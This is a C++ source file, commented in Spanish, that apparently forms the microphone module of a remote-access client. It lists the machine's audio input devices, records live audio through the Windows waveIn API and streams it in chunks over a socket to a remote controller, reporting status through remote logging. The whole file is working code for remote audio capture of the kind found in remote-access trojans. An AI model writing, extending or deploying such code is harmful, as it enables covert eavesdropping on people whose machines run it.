#include "mod_mic.hpp"
#include "misc.hpp"

constexpr int NUM_BUFFERS = 2;
constexpr int SAMPLE_RATE = 11025; // 11.02khz
constexpr int NUM_CHANNELS = 2;
constexpr int BITS_PER_SAMPLE = 16;

constexpr int BUFFER_SIZE = SAMPLE_RATE * NUM_CHANNELS * BITS_PER_SAMPLE / 8; //un segundo

extern Cliente* cCliente;

std::vector<std::string> Mod_Mic::m_ObtenerDispositivos() {
    
    std::vector<std::string> vcOut;
    for (int i = 0; i < int(waveInGetNumDevs()); i++) {
        WAVEINCAPS wvMic;
        MMRESULT mRes = waveInGetDevCaps(i, &wvMic, sizeof(wvMic));
        if (mRes != MMSYSERR_BADDEVICEID && mRes != MMSYSERR_NOMEM) {
            std::string strDevice = "[";
            strDevice += std::to_string(i);
            strDevice.append(1, ']');
            strDevice += wvMic.szPname;
            vcOut.push_back(strDevice);
        }
    }

    return vcOut;
}

void Mod_Mic::m_Enviar_Dispositivos() {
    
    std::vector<std::string> vc_devices = this->m_ObtenerDispositivos();
    std::string strSalida = "No hay dispositivos";

    if (vc_devices.size() > 0) {
        strSalida = "";
        for (auto strDevice : vc_devices) {
            strSalida += strDevice;
            strSalida.append(1, CMD_DEL);
        }
        strSalida.pop_back();

    }

    cCliente->cChunkSend(this->sckSocket, strSalida.c_str(), strSalida.size(), 0, true, nullptr, EnumComandos::Mic_Refre_Resultado);
}

void Mod_Mic::m_EmpezarLive() {
    this->isLiveMic = true;
    this->thLiveMic = std::thread(&Mod_Mic::m_LiveMicTh, this);
}

void Mod_Mic::m_DetenerLive() {
    std::unique_lock<std::mutex> lock(this->mic_mutex);
    this->isLiveMic = false;
    lock.unlock();

    if (this->thLiveMic.joinable()) {
        this->thLiveMic.join();
    }
}

void Mod_Mic::m_LiveMicTh() {
    std::string strMSG = "[!] thLiveMic iniciada, dispositivo#: ";
    _DBG_(strMSG, this->p_DeviceID);
    cCliente->m_RemoteLog("[MIC] Iniciando live en dev: " + std::to_string(this->p_DeviceID));

    
    // Definir el formato de audio
    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = NUM_CHANNELS;
    wfx.nSamplesPerSec = SAMPLE_RATE;
    wfx.wBitsPerSample = BITS_PER_SAMPLE;
    wfx.nBlockAlign = (wfx.wBitsPerSample / 8) * wfx.nChannels;
    wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;

    //BUFFER_SIZE = SAMPLE_RATE * NUM_CHANNELS * BITS_PER_SAMPLE
    // Abrir el dispositivo de grabación
    
    HWAVEIN wi;
    if (waveInOpen(&wi, this->p_DeviceID, &wfx, (DWORD_PTR)nullptr, (DWORD_PTR)nullptr, CALLBACK_NULL | WAVE_FORMAT_DIRECT) != MMSYSERR_NOERROR) {
        strMSG = "Error abriendo ";
        strMSG += std::to_string(this->p_DeviceID);
        __DBG_(strMSG);
        cCliente->m_RemoteLog("[MIC] Error abriendo dev: " + std::to_string(this->p_DeviceID));
        return;
    }

    
  // Crear buffers de audio
    WAVEHDR headers;
    ZeroMemory(&headers, sizeof(headers));

    WORD* buffers = new WORD[wfx.nAvgBytesPerSec];
    if (buffers == NULL) {
        __DBG_("No se pudo reservar memoria para el mic");
        waveInClose(wi);
        return;
    }

    headers.dwBufferLength = wfx.nAvgBytesPerSec;
    headers.lpData = reinterpret_cast<LPSTR>(buffers);

    if(waveInPrepareHeader(wi, &headers, sizeof(headers)) != MMSYSERR_NOERROR) {
        __DBG_("No se pudo preparar el header");
        waveInClose(wi);
        if (buffers) {
            delete[] buffers;
            buffers = nullptr;
        }
        return;
    }

    if(waveInAddBuffer(wi, &headers, sizeof(headers)) != MMSYSERR_NOERROR) {
        __DBG_("No se pudo agregar datos al buffer");
        waveInUnprepareHeader(wi, &headers, sizeof(headers));
        waveInClose(wi);
        if (buffers) {
            delete[] buffers;
            buffers = nullptr;
        }
        return;
    }

    // Iniciar grabación
    if (waveInStart(wi) != MMSYSERR_NOERROR) {
        __DBG_("Error iniciando la grabacion");
        waveInUnprepareHeader(wi, &headers, sizeof(headers));
        waveInClose(wi);
        if (buffers) {
            delete[] buffers;
            buffers = nullptr;
        }
        return;
    }

    //Real time
    // Bucle principal de captura y envío de audio
    int iBuffsize = BUFFER_SIZE;
    
    std::vector<char> newBuffer(iBuffsize);
    
    while (this->isLiveMic) {
        if (headers.dwFlags & WHDR_DONE) {
            std::memcpy(newBuffer.data(), headers.lpData, headers.dwBufferLength);
                
            cCliente->cChunkSend(this->sckSocket, newBuffer.data(), iBuffsize, 0, true, nullptr, EnumComandos::Mic_Live_Packet);

            if (waveInAddBuffer(wi, &headers, sizeof(headers)) != MMSYSERR_NOERROR) {
                break;
            }
        }
    }

    // Detener y limpiar la grabación
    waveInStop(wi);
    waveInUnprepareHeader(wi, &headers, sizeof(headers));

    if (buffers) {
        delete[] buffers;
        buffers = nullptr;
    }
    waveInClose(wi);

    cCliente->cChunkSend(cCliente->sckSocket, "0", 1, 0, true, nullptr, EnumComandos::Mic_Stop);

    strMSG = "[!] thLiveMicTh finalizada";
    __DBG_(strMSG);

    cCliente->m_RemoteLog("[MIC] Live finalizado");
}